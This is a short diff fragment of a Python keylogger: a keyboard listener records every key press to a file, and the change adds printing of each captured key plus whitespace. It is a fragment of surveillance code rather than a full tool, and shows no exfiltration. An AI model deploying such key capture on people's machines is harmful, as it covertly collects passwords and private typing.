@@ -11,9 +11,12 @@ def addtofile(key):
             elif keydata.startswith("Key"):
                 f.write(f' [{keydata}] ')
             else:
+                print(keydata)
                 f.write(keydata)
     except Exception as e:
+
         print(f"Error writing to file: {e}")
 
 with Listener(on_press=addtofile) as l:
     l.join()
+    
